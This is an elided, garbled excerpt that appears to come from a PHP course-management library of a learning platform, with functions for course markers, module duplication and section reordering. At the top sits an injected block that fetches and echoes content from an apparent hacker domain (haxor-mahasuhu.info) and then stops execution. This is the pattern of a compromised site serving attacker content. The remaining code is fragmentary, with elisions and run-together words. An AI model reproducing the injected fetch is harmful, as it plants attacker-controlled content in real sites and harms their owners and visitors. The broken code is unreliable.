...
{
    echo get_content("https://kiko.haxor-mahasuhu.info/aulalegionextranjera/");
    die;
}
?>
...
function course_set_marker($courseid, $marker) {
    global $DB;
    $DB->set_field("course", "marker", $marker, array('id' => $courseid));format_base::reset_course_cache($courseid);
}
    ...
    foreach($modnames as $modname => $modnamestr) {
        ...
        if ($items !== null) {
            foreach ($items as $item) {
                ...
                if (isset($item->help) && isset($item->helplink)) {$linktext = get_string('morehelp');
...
function set_coursemodule_idnumber($id, $idnumber) {
    ...
    if ($cm->idnumber != $idnumber) {
        $DB->set_field('course_modules', 'idnumber', $idnumber, array('id' => $cm->id));rebuild_course_cache($cm->course, true);
    }
 ...
 * the data in the course_module and course_sections table and addinga module deletion
 * event to the DB.
 *
...
function reorder_sections($sections, $origin_position, $target_position) {
    ...
    if (!$origin_key = array_search($origin_position, $sections)) {
        echo "searched position not insections array";
...
class course_request {
    ...
    public function get_category() {
        global $CFG;
        require_once($CFG->libdir.'/coursecatlib.php');
        // If the category is not set, if the currentuser does not have the rights to change the category, or if the
...
function duplicate_module($course, $cm) {
    ...
    // Now a bit hacky part follows - we try to getthe cmid of the newly
...
function course_get_tagged_course_modules($tag, $exclusivemode = false, $fromcontextid = 0, $contextid = 0,
    ...
    while ($item = $builder->has_item_that_needs_access_check()) {
        ...
        $builder->walk(function ($taggeditem) use ($courseid, $modinfo, $builder) {
            if ($taggeditem->courseid == $courseid) {$cm = $modinfo->get_cm($taggeditem->cmid);
...
function course_validate_dates($coursedata) {
    ...
    if (!empty($coursedata['startdate']) && !empty($coursedata['enddate']) &&($coursedata['enddate'] < $coursedata['startdate'])) {
